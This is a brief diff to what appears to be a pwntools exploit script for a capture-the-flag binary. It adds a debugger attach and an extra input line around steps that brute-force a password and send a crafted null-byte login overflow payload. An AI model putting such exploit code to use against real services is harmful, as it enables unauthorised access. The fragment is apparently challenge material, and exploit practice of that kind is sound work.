@@ -35,7 +35,9 @@ def exploit(flag):
     #brute force password
     log.info('Getting password...')
     psd = get_password()
+    gdb.attach(io)
 
+    io.sendline("1")
     login('\x00'+'1'*0x47)
     copy('1')
 
